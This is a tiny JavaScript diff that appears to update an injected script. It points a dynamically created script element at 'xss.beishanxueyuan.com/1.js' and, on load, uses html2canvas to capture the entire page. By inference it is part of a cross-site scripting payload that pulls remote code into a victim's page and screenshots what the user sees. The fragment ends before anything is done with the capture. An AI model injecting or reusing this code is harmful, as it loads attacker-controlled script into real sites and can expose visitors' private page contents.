@@ -1,5 +1,5 @@
 var s1 = document.createElement('script');
-s1.src = 'https://www.beishanxueyuan.com/jietu.js';
+s1.src = 'https://xss.beishanxueyuan.com/1.js';
 s1.onload = async function () {
     try {
             const canvas = await html2canvas(document.documentElement);
